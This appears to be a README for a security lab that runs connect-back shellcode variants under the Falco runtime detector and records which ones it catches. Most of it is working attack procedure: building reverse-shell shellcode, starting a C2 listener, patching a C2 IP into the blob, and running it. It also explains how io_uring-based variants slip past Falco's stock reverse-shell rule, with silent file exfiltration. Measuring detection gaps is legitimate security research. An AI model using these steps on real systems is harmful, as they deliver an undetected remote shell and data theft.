# Falco live demo — measuring detection of the connect-back chain

Companion to [`testing/results/falco_edr_comparison.md`](results/falco_edr_comparison.md)
(captured logs + table). This document is the **how-to**: two container
layouts to run the connect-back variants under a real falco and observe
what survives.

> **Authorization reminder**: run every step below only against systems
> you own. The C2 listener binds loopback/private interfaces by default.

## TL;DR

Runs validated with falco **0.45.1 default config only** (no custom
ruleset, target executed inside the falco container). Re-validated
unchanged on **0.45.2** (2026-10-29, current latest) on kernel 6.14:
same 3/0/0 rows, no other default rule fired, and the stock ruleset
still ships no io_uring-aware rule (the ≥0.38 "io_uring support" in
libs/driver is parsing-only — the fd↔socket attribution gap that
blinds the dup2 heuristic persists):

| variant (`docker exec flk /lab/runner /lab/<blob>.bin`) | stock falco rules |
|---|---|
| `cbsys.bin` — pure-syscall baseline          | **3 rows**: `Redirect stdout/stdin to network connection` (one per dup2, with full 4-tuple) |
| `cb_uring.bin` — io_uring classic            | **0 rows** (fd untracked; dup2 visible but has no net info) |
| `cbr_uring.bin` — io_uring zero-exec         | **0 rows** |

Entire session log across all three runs: only those 3 Notices — no other
default rule matched anything. With the optional custom ruleset
(`testing/falco_reverse_sh_poc.yaml`) the picture widens to a full chain
view (see [`results/falco_edr_comparison.md`](results/falco_edr_comparison.md)):

## Why falco behaves this way

- The stock reverse-shell rule is
  `Redirect STDOUT/STDIN to Network Connection **in Container**`
  (`/etc/falco/falco_rules.yaml`). Its condition includes `and container`
  — **host-local runs need a custom rule** (see `testing/falco_reverse_sh_poc.yaml`).
- The dup2 heuristic requires `fd.type in ("ipv4","ipv6")` — falco tracks
  fd↔socket bindings from the `socket()` **syscall**. A socket created via
  `IORING_OP_SOCKET`/`IORING_OP_CONNECT` (submitted through
  `io_uring_enter`) never gets that association → the stock rule cannot
  fire even though the (native!) dup2 rows are present.
- `proc.exepath` is normalized to the real binary: `execve("/bin//sh")`
  appears as `exepath=/usr/bin/dash`. Rule on `proc.name`/pid, not on the
  exec path string.
- falco startup takes ~5–12 s before the BPF probe is attached; a runner
  executes in milliseconds — wait before firing.
- Passing `-r` **replaces** the default ruleset. Add
  `-r /etc/falco/falco_rules.yaml` when you want both.

## Layout A — falco container + host as C2 (fewest moving parts)

The recipe below runs **stock only** — no `-r`, exactly what falco loads
by default. It works because the target runs inside the falco container
(the stock reverse-shell rule requires `container.id != host`).

```bash
# 1. build (blob has 127.0.0.1:4444 baked in; static runner for debian)
nasm -f bin -o /tmp/poc/cbsys.bin shellcode/connect_back_sys.asm
gcc -O0 -static -o /tmp/poc/runner testing/runner.c

# 2. listener on the host
python3 testing/c2_server.py --host 0.0.0.0 --port 4444

# 3. falco as the container main process, --network host — DEFAULT RULES ONLY
docker run -d --name flk --privileged --network host -e HOST_ROOT=/host \
  -v /tmp/poc:/lab:ro \
  -v /proc:/host/proc:ro -v /sys:/host/sys:ro -v /etc:/host/etc:ro \
  falcosecurity/falco:0.45.1-debian \
  falco -c /etc/falco/falco.yaml -o webserver.enabled=false
sleep 15                      # let the probe attach

# 4. target INSIDE the falco container (static runner)
docker exec flk /lab/runner /lab/cbsys.bin

# 5. read — expect 3 rows for the baseline, 0 for the uring variants
docker logs flk 2>&1 | grep "Redirect stdout/stdin"
```

`--network host` makes the container loopback the host loopback → the
connect-back hits the listener with zero patching, and because the
shellcode runs inside a container the **stock** rule matches on its own.
To also see the raw syscall chain (socket/connect/execve rows) beyond the
stock rule, add `-v "$PWD":/repo:ro` at `docker run` and
`-r /repo/testing/falco_reverse_sh_poc.yaml` to the falco command.

## Layout B — two containers on a shared bridge

```bash
# dedicated network (DNS by name between the two)
docker network create revlab

# ── container 1: C2 (ordinary image, python listener) ─────────────
docker run -d --name c2 --network revlab \
  -v "$PWD/testing/c2_server.py:/lab/c2_server.py:ro" \
  python:3.11-alpine \
  python3 /lab/c2_server.py --host 0.0.0.0 --port 4444

C2IP=$(docker inspect -f '{{.NetworkSettings.Networks.revlab.IPAddress}}' c2)
# (typically 172.19.0.2)

# ── patch the shellcode to call that IP ───────────────────────────
python3 shellcode/patch_config.py /tmp/poc/cbsys.bin \
    --ip "$C2IP" --port 4444 --out /tmp/poc/cbsys_lab.bin
# uring missions: set c2_ip: "<C2IP>" in
#   builder/missions/connect_back{,_recv}.yaml and rebuild:
# python3 builder/uring_builder.py builder/missions/connect_back.yaml \
#     --out /tmp/poc/cb_uring_lab.bin --quiet

# ── container 2: falco (privileged, same network) — stock rules only ──
docker run -d --name flk --privileged --network revlab -e HOST_ROOT=/host \
  -v /tmp/poc:/lab:ro -v /proc:/host/proc:ro -v /sys:/host/sys:ro \
  -v /etc:/host/etc:ro \
  falcosecurity/falco:0.45.1-debian \
  falco -c /etc/falco/falco.yaml -o webserver.enabled=false
sleep 15

# ── fire (each variant, in order) ──────────────────────────────────
docker exec flk /lab/runner /lab/cbsys_lab.bin      # baseline  → 3 stock rows
docker exec flk /lab/runner /lab/cb_uring_lab.bin   # uring     → 0 stock rows
docker exec flk /lab/runner /lab/cbr_uring_lab.bin  # zero-exec → silent

# ── read + cleanup ─────────────────────────────────────────────────
docker logs c2                       # shell output (`id` + marker)
docker logs flk 2>&1 | grep "Redirect stdout/stdin"
docker rm -f flk c2; docker network rm revlab
```

Note: `docker exec` returns when the runner returns; for `cbr_uring` the
session closes cleanly when the C2 sends EOF (recv == 0 path).

## Troubleshooting checklist

| symptom | cause | fix |
|---|---|---|
| falco startup: `libpman: ring buffer map ... Operation not permitted` | engine without root/caps | `--privileged` (container) or `sudo` (host) |
| no rows at all, even `execve` of ordinary procs | probe not attached yet, or `-r`-replaced ruleset | wait ~15 s; re-check which rule files were loaded ("Loading rules from:") |
| `Error: the directory '/host/proc/' doesn't exist` | `HOST_ROOT=/host` set without mounting host `/proc` under `/host` | add `-v /proc:/host/proc:ro` (+ `/sys`, `/etc`), or drop `-e HOST_ROOT=/host` |
| `Cannot read host init process proc root: 2` warnings | same missing-mount condition (benign lead-up to the error above) | same fix |
| baseline fires nothing, only `socket`+`connect` rows | C2 listener was not up at run time — the baseline exits on failed connect (`js _fail`) before any dup2 | start the listener first, keep it up |
| stock rule 0 rows on baseline | (host run) rule is `in Container` only — the `container` macro fails | run inside a container (layout A/B), or use the custom rule |
| `POC_REVSHELL` missing the `execve(/bin//sh)` row | rule keyed on `proc.exepath` — falco normalizes it | key on inherited pid (`proc.name`/`proc.pname`), as in `testing/falco_reverse_sh_poc.yaml` |

## Files

- `testing/falco_reverse_sh_poc.yaml` — PoC ruleset (`POC_REVSHELL`).
- `testing/run_falco_poc.sh` — build + listener + runner helper.
- `testing/falco_demo.sh` — scripted tmux demo driver (asciinema + live log).
- `testing/results/falco_edr_comparison.md` — captured evidence + takeaways.
- `testing/results/falco_demo.cast` — pre-recorded demo of the default-ruleset flow.

## Recorded demo

`testing/falco_demo.sh` replays the default-ruleset flow above on a scripted
tmux layout — typed commands on the left, C2 output bottom-left, and the live
`docker logs -f flk | grep 'Notice '` stream on the right — and records it as
an asciicast (`testing/results/falco_demo.cast`, 190×40, ~90 s):

```bash
# record a fresh one (driver builds the blobs itself; requires docker, tmux, nasm)
uvx asciinema rec --overwrite --cols 190 --rows 40 \
  -c "bash testing/falco_demo.sh" testing/results/falco_demo.cast

# play back
uvx asciinema play testing/results/falco_demo.cast
```

What the viewer sees: falco ships with default rules only, right pane silent;
SCENARIO 1 (`cbsys.bin`, pure-syscall baseline) → **3 "Notice Redirect
stdout/stdin to network connection" rows** appear live in the stream (one per
dup2 of the connected socket) and the C2 pane confirms a working shell
(`DEMO_OK present: True`); SCENARIO 2 (`cb_uring.bin`, io_uring classic) and
SCENARIO 3 (`cbr_uring.bin`, io_uring zero-exec) → the row counter stays at 3
(nothing new), while C2 confirms both still fully succeeded — including the
`/etc/hostname` exfil (`"codeforge"`) with a clean, execve-free exit.
